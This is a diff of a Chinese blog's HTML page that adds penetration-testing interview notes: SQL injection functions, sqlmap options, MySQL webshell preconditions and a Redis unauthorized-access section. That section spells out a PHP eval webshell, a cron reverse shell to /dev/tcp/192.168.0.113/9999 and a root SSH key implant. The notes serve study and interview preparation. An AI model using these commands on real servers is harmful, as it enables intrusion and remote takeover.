@@ -6,7 +6,16 @@
     <meta charset="utf-8">
     <meta name="keywords" content="面试复习五, Robin">
     <meta name="description" content="前言因为这段时间面试了几次，也看了很多别人的面试总结，所以抽个时间总结一下自己面试的内容。
-sql注入常见函数禁用和过滤语句sqlmap常见参数sqlmapOSShellmysql写shell前置条件XSS常用payload、标签XSS分类">
+sql注入常见函数
+#MySQL数据库版本
+version()
+
+#数据库安装路径
+@@basedir
+
+#数据库文件存放路径
+@@datadir
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -407,21 +416,21 @@ sql注入常见函数禁用和过滤语句sqlmap常见参数sqlmapOSShellmysql�
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-04-01
+                    2024-08-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    325
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    5 分
                 </div>
                 
 
@@ -442,7 +451,93 @@ sql注入常见函数禁用和过滤语句sqlmap常见参数sqlmapOSShellmysql�
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>因为这段时间面试了几次，也看了很多别人的面试总结，所以抽个时间总结一下自己面试的内容。</p>
-<h2 id="sql注入常见函数"><a href="#sql注入常见函数" class="headerlink" title="sql注入常见函数"></a>sql注入常见函数</h2><h2 id="禁用和过滤语句"><a href="#禁用和过滤语句" class="headerlink" title="禁用和过滤语句"></a>禁用和过滤语句</h2><h2 id="sqlmap常见参数"><a href="#sqlmap常见参数" class="headerlink" title="sqlmap常见参数"></a>sqlmap常见参数</h2><h2 id="sqlmapOSShell"><a href="#sqlmapOSShell" class="headerlink" title="sqlmapOSShell"></a>sqlmapOSShell</h2><h2 id="mysql写shell前置条件"><a href="#mysql写shell前置条件" class="headerlink" title="mysql写shell前置条件"></a>mysql写shell前置条件</h2><h2 id="XSS常用payload、标签"><a href="#XSS常用payload、标签" class="headerlink" title="XSS常用payload、标签"></a>XSS常用payload、标签</h2><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h2 id="SSRF和CSRF"><a href="#SSRF和CSRF" class="headerlink" title="SSRF和CSRF"></a>SSRF和CSRF</h2><h2 id="文件上传黑名单绕过"><a href="#文件上传黑名单绕过" class="headerlink" title="文件上传黑名单绕过"></a>文件上传黑名单绕过</h2><h2 id="Redis未授权绕过"><a href="#Redis未授权绕过" class="headerlink" title="Redis未授权绕过"></a>Redis未授权绕过</h2><h2 id="shiro反序列化漏洞原理、cookie加密流程"><a href="#shiro反序列化漏洞原理、cookie加密流程" class="headerlink" title="shiro反序列化漏洞原理、cookie加密流程"></a>shiro反序列化漏洞原理、cookie加密流程</h2><h2 id="url后缀名-do-action是什么框架"><a href="#url后缀名-do-action是什么框架" class="headerlink" title="url后缀名.do.action是什么框架"></a>url后缀名.do.action是什么框架</h2><h2 id="weblogic漏洞"><a href="#weblogic漏洞" class="headerlink" title="weblogic漏洞"></a>weblogic漏洞</h2><h2 id="sql盲注告警判断成功"><a href="#sql盲注告警判断成功" class="headerlink" title="sql盲注告警判断成功"></a>sql盲注告警判断成功</h2><h2 id="从请求返回包判断文件上传告警分析上传成功"><a href="#从请求返回包判断文件上传告警分析上传成功" class="headerlink" title="从请求返回包判断文件上传告警分析上传成功"></a>从请求返回包判断文件上传告警分析上传成功</h2><h2 id="定位恶意ip怎么处理"><a href="#定位恶意ip怎么处理" class="headerlink" title="定位恶意ip怎么处理"></a>定位恶意ip怎么处理</h2><h2 id="windows查看计划任务"><a href="#windows查看计划任务" class="headerlink" title="windows查看计划任务"></a>windows查看计划任务</h2><h2 id="linux查看计划任务"><a href="#linux查看计划任务" class="headerlink" title="linux查看计划任务"></a>linux查看计划任务</h2><h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><h2 id="fastjson漏洞原理"><a href="#fastjson漏洞原理" class="headerlink" title="fastjson漏洞原理"></a>fastjson漏洞原理</h2><h2 id="shiro密钥会变的情况"><a href="#shiro密钥会变的情况" class="headerlink" title="shiro密钥会变的情况"></a>shiro密钥会变的情况</h2><h2 id="后门分析流程"><a href="#后门分析流程" class="headerlink" title="后门分析流程"></a>后门分析流程</h2><h2 id="java、C-、python工具"><a href="#java、C-、python工具" class="headerlink" title="java、C++、python工具"></a>java、C++、python工具</h2><h2 id="鉴权漏洞接口"><a href="#鉴权漏洞接口" class="headerlink" title="鉴权漏洞接口"></a>鉴权漏洞接口</h2><h2 id="栈溢出、格式化字符串"><a href="#栈溢出、格式化字符串" class="headerlink" title="栈溢出、格式化字符串"></a>栈溢出、格式化字符串</h2><h2 id="网站访问重定向"><a href="#网站访问重定向" class="headerlink" title="网站访问重定向"></a>网站访问重定向</h2><h2 id="DNS劫持了怎么办"><a href="#DNS劫持了怎么办" class="headerlink" title="DNS劫持了怎么办"></a>DNS劫持了怎么办</h2><h2 id="防火墙和WAF"><a href="#防火墙和WAF" class="headerlink" title="防火墙和WAF"></a>防火墙和WAF</h2><h2 id="网络基础排障"><a href="#网络基础排障" class="headerlink" title="网络基础排障"></a>网络基础排障</h2><h2 id="无网排障"><a href="#无网排障" class="headerlink" title="无网排障"></a>无网排障</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一面问的时候大多会问技术细节，这时候照着面筋回答就好了。<br>二面三面问的是项目上的工作细节，不会详细问你一个点，而是问得很广泛，例如：渗透测试的流程、应急响应做过吗、java框架漏洞了解哪些、你以前的工作有什么成果。</p>
+<h2 id="sql注入常见函数"><a href="#sql注入常见函数" class="headerlink" title="sql注入常见函数"></a>sql注入常见函数</h2><pre><code>
+#MySQL数据库版本
+version()
+
+#数据库安装路径
+@@basedir
+
+#数据库文件存放路径
+@@datadir
+
+#操作系统版本
+@@version_compile_os
+
+#拼接字符串，显示内容
+函数concat()、concat_ws()、group_concat()
+
+#截取字符串
+substr()、substring()、mid()
+</code></pre>
+<h2 id="sqlmap常见参数"><a href="#sqlmap常见参数" class="headerlink" title="sqlmap常见参数"></a>sqlmap常见参数</h2><pre><code>
+-v                  输出级别（0~6，默认1）
+-u url              指定url
+--data=DATA         该参数指定的数据会被作为POST数据提交
+-r file.txt         常用于POST注入或表单提交时注入
+--cookie            设置cookie
+--threads           指定线程并发数
+--level             检测级别（1~5，默认1）
+--risk              风险等级（1~4，默认1）
+--banner            列举数据库系统的信息等
+--sql-query         执行任意的SQL语句
+--sql-shell         使用交互式SQL语句执行环境
+--flie-read         读取文件
+--os-cmd            执行任意系统命令
+--os-shell          使用交互式shell执行命令
+</code></pre>
+<h2 id="sqlmapOSShell"><a href="#sqlmapOSShell" class="headerlink" title="sqlmapOSShell"></a>sqlmapOSShell</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>–os-shell的本质就是写入两个php文件，一个文件是上传页面可以让我们上传文件到网站路径下。<br>另一个文件是用于命令执行的页面，将执行后的结果输出到sqlmap中</p>
+<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>前提条件：</p>
+<pre><code>    知道网站的物理路径
+    高权限数据库用户
+    secure_file_priv无限制
+    网站路径有写入权限
+</code></pre>
+<p>首先保存一份请求包文件，使用 <code>python sqlmap.py -r xxx.txt -dbms=数据库类型 --os-shell</code> 跑一下<br>然后根据实际情况选择搭建网站的语言以及网站物理地址即可</p>
+<h2 id="mysql写shell前置条件"><a href="#mysql写shell前置条件" class="headerlink" title="mysql写shell前置条件"></a>mysql写shell前置条件</h2><p>①数据库的当前用户为ROOT或拥有FILE权限；<br>② 知道网站目录的绝对路径；<br>③ PHP的GPC参数为off状态；<br>④ MySQL中的secure_file_priv参数不能为NULL状态</p>
+<h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><h4 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h4><p><code>redis.conf</code> 配置文件中配置为任何机器都可以登录 <code>redis</code> ，而且未设置密码或者设置弱口令</p>
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>一般都使用kali的redis-cli工具</p>
+<h5 id="利用redis写入webshell"><a href="#利用redis写入webshell" class="headerlink" title="利用redis写入webshell"></a>利用redis写入webshell</h5><pre><code>
+config set dir /var/www/html/（网站目录） 
+config set dbfilename shell.php
+set xxx &quot;&lt;?php eval($_REQUEST[cmd]);?&gt;&quot; 
+
+# set xxx &quot;\r\n\r\n&lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;\r\n\r\n&quot;   
+#\r\n\r\n 代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行
+
+save
+</code></pre>
+<h5 id="任务计划反弹Shell"><a href="#任务计划反弹Shell" class="headerlink" title="任务计划反弹Shell"></a>任务计划反弹Shell</h5><pre><code>
+set  xx   &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.113/9999 0&gt;&amp;1\n&quot;
+config set dir 定时文件目录
+config set dbfilename root
+save
+</code></pre>
+<p>Ubuntu 不能用的原因是 redis 写文件后是 644 权限，但是 Ubuntu 要求执行定时任务文件的权限是600</p>
+<h5 id="ssh-keygen-公钥登录服务器"><a href="#ssh-keygen-公钥登录服务器" class="headerlink" title="ssh-keygen 公钥登录服务器"></a>ssh-keygen 公钥登录服务器</h5><pre><code>
+# 攻击方生成一对key
+ssh-keygen -t rsa
+
+# 将生成的公钥值写入目标服务器
+(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt
+cat /tmp/foo.txt | redis-cli -h 192.168.1.100 -p 6379 -x set crackit
+
+# 连接目标
+$ redis-cli -h 192.168.1.100 -p 6379        使用工具连接
+192.168.1.100:6379&gt; config set dir /root/.ssh/
+192.168.1.100:6379&gt; config get dir
+192.168.1.100:6379&gt; config set dbfilename &quot;authorized_keys&quot;
+192.168.1.100:6379&gt; save
+
+# 通过ssh连接目标
+ssh root@192.168.1.100 -i ~/.ssh/id_rsa
+</code></pre>
+<h5 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h5><p>主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。<br>通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。<br>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。</p>
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>在执行命令的时候要加上<code>\n\n</code>，否则容易出现乱码</p>
+<h2 id="url后缀名-do-action是什么框架"><a href="#url后缀名-do-action是什么框架" class="headerlink" title="url后缀名.do.action是什么框架"></a>url后缀名.do.action是什么框架</h2><p>一般是Struts2或者Spring框架。<br>在URL中添加不存在的路径，如果返回同样的页面，则大概率是Struts2框架，如果返回404或者是报错，则大概率是Spring框架。</p>
+<h2 id="sql盲注告警判断成功"><a href="#sql盲注告警判断成功" class="headerlink" title="sql盲注告警判断成功"></a>sql盲注告警判断成功</h2><p>正常有回显的注入看返回的状态码和数据内容就知道是否成功，但是盲注需要查看时间差</p>
+<h2 id="判断文件上传告警分析上传成功"><a href="#判断文件上传告警分析上传成功" class="headerlink" title="判断文件上传告警分析上传成功"></a>判断文件上传告警分析上传成功</h2><p>首先看告警记录是否包含webshell流量特征、是否有“上传成功”或“success upload”等信息提示<br>然后查看服务器中是否存在上传的文件，是否是系统自动删除的<br>查看日志是否有脚本文件的访问记录</p>
+<h2 id="fastjson漏洞原理"><a href="#fastjson漏洞原理" class="headerlink" title="fastjson漏洞原理"></a>fastjson漏洞原理</h2><h2 id="shiro密钥会变的情况"><a href="#shiro密钥会变的情况" class="headerlink" title="shiro密钥会变的情况"></a>shiro密钥会变的情况</h2><h2 id="后门分析流程"><a href="#后门分析流程" class="headerlink" title="后门分析流程"></a>后门分析流程</h2><h2 id="java、C-、python工具"><a href="#java、C-、python工具" class="headerlink" title="java、C++、python工具"></a>java、C++、python工具</h2><h2 id="鉴权漏洞接口"><a href="#鉴权漏洞接口" class="headerlink" title="鉴权漏洞接口"></a>鉴权漏洞接口</h2><h2 id="栈溢出、格式化字符串"><a href="#栈溢出、格式化字符串" class="headerlink" title="栈溢出、格式化字符串"></a>栈溢出、格式化字符串</h2><h2 id="网站访问重定向"><a href="#网站访问重定向" class="headerlink" title="网站访问重定向"></a>网站访问重定向</h2><h2 id="DNS劫持了怎么办"><a href="#DNS劫持了怎么办" class="headerlink" title="DNS劫持了怎么办"></a>DNS劫持了怎么办</h2><h2 id="防火墙和WAF"><a href="#防火墙和WAF" class="headerlink" title="防火墙和WAF"></a>防火墙和WAF</h2><h2 id="网络基础排障"><a href="#网络基础排障" class="headerlink" title="网络基础排障"></a>网络基础排障</h2><h2 id="无网排障"><a href="#无网排障" class="headerlink" title="无网排障"></a>无网排障</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一面问的时候大多会问技术细节，这时候照着面筋回答就好了。<br>二面三面问的是项目上的工作细节，不会详细问你一个点，而是问得很广泛，例如：渗透测试的流程、应急响应做过吗、java框架漏洞了解哪些、你以前的工作有什么成果。</p>
 
                 
             </div>
@@ -1094,7 +1189,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">161.9k</span>
+                        class="white-color">162.9k</span>
             
             
             
